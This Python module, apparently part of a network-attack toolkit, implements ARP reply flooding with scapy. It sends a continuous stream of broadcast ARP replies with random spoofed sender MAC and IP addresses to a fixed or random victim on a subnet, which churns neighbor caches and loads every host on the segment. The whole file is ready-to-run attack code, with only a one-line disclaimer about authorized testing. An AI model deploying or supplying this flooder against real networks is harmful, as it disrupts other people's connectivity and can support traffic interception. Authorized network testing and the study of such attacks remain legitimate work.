"""ARP reply flooding: broadcast a stream of unsolicited ARP replies.

Each reply carries a random unicast sender MAC and a random sender IP from the
chosen subnet, and claims that IP for the sender. The target is either a fixed
victim IP or a random host of the subnet. Every host on the segment has to parse
each broadcast, and the stream can churn the neighbor caches of the hosts that
accept the replies.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, random_mac

ZERO_MAC = "00:00:00:00:00:00"
ARP_REPLY = 2


@dataclass(frozen=True)
class ArpReplyFloodingConfig:
    iface: str                  # attacker interface, on the segment
    subnet: str                 # CIDR the random senders (and random victims) come from
    victim_ip: str = ""         # fixed IP to address the replies to; empty = random host
    count: int = 0              # replies to send; 0 = run until stopped
    interval: float = 0.0       # seconds between replies
    dry_run: bool = False       # build replies but do not send them

    def __post_init__(self) -> None:
        network = _subnet(self.subnet)
        if network.num_addresses < 4:
            raise ValueError("The subnet needs at least two usable hosts.")
        if self.victim_ip.strip():
            parse_ipv4(self.victim_ip, "victim IP")


def _subnet(value: str) -> ipaddress.IPv4Network:
    text = value.strip()
    if not text:
        raise ValueError("Subnet is required, for example 192.168.1.0/24.")
    try:
        return ipaddress.IPv4Network(text, strict=False)
    except ValueError:
        raise ValueError(f"Invalid subnet: {value}") from None


@dataclass
class ArpReplyFloodingStats:
    frames: int = 0


def build_arp_reply(sender_mac: str, sender_ip: str, victim_ip: str) -> Packet:
    """Broadcast ARP reply: `sender_ip` is at `sender_mac`, announced to `victim_ip`."""
    return Ether(src=sender_mac, dst=BROADCAST_MAC) / ARP(
        op=ARP_REPLY,
        hwsrc=sender_mac,
        psrc=sender_ip,
        hwdst=ZERO_MAC,
        pdst=victim_ip,
    )


def _random_host(network: ipaddress.IPv4Network, rng: random.Random) -> str:
    low = int(network.network_address) + 1
    high = int(network.broadcast_address) - 1
    return str(ipaddress.IPv4Address(rng.randint(low, high)))


def run_arp_reply_flooding(
    config: ArpReplyFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ArpReplyFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> ArpReplyFloodingStats:
    """Send ARP replies with random senders until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp
    network = _subnet(config.subnet)
    fixed_victim = parse_ipv4(config.victim_ip, "victim IP") if config.victim_ip.strip() else ""
    stats = ArpReplyFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_arp_reply(
            random_mac(rng),
            _random_host(network, rng),
            fixed_victim or _random_host(network, rng),
        )
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
